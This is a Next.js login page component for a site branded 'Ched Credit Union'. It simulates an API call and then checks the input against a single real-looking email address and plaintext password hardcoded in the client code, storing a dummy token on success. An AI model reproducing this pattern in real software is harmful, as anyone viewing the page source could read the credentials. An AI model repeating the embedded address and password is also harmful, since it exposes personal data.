"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent, CardDescription, CardHeader, CardTitle, CardFooter } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { Loader2 } from "lucide-react"
import Link from "next/link"

export default function LoginPage() {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [error, setError] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const router = useRouter()

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setError("")

    // Redirect to loading page
    router.push("/loading")

    // Simulate API call
    await new Promise((resolve) => setTimeout(resolve, 2000))

    if (username === "michaelclayton783@outlook.com" && password === "Mikeclayton1965") {
      localStorage.setItem("auth_token", "dummy_token")
      router.push("/verify")
    } else {
      setError("Invalid credentials")
      setIsLoading(false)
      router.push("/login")
    }
  }

  return (
    <div className="flex flex-col min-h-screen bg-gray-100">
      <header className="border-b bg-white">
        <div className="max-w-7xl mx-auto px-4 md:px-6 lg:px-8">
          <div className="flex items-center justify-center h-16">
            <Link href="/" className="flex items-center gap-2">
              <div className="relative w-10 h-10">
                <Image
                  src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/IMG_1502-o7tNDKqvlQTBOgwnakO9CD0CMkPLU6.png"
                  alt="Ched Credit Union"
                  fill
                  className="object-contain"
                  priority
                  sizes="40px"
                />
              </div>
              <span className="text-2xl font-bold text-blue-600">Ched Credit Union</span>
            </Link>
          </div>
        </div>
      </header>

      <main className="flex-grow flex items-center justify-center px-4 sm:px-6 lg:px-8">
        <Card className="w-full max-w-md">
          <CardHeader className="space-y-1">
            <CardTitle className="text-2xl font-bold text-center">Sign In</CardTitle>
            <CardDescription className="text-center">Enter your credentials to access your account</CardDescription>
          </CardHeader>
          <form onSubmit={handleSubmit}>
            <CardContent className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="username">Email</Label>
                <Input
                  id="username"
                  placeholder="Enter your email"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  disabled={isLoading}
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="password">Password</Label>
                <Input
                  id="password"
                  type="password"
                  placeholder="Enter your password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  disabled={isLoading}
                />
              </div>
              {error && <p className="text-red-500 text-sm">{error}</p>}
            </CardContent>
            <CardFooter className="flex flex-col space-y-4">
              <Button className="w-full" type="submit" disabled={isLoading}>
                {isLoading ? (
                  <>
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                    Signing in...
                  </>
                ) : (
                  "Sign In"
                )}
              </Button>
              <Link href="/forgot-password" className="w-full">
                <Button variant="link" className="text-sm text-blue-600 w-full" type="button">
                  Forgot username or password?
                </Button>
              </Link>
            </CardFooter>
          </form>
        </Card>
      </main>
    </div>
  )
}

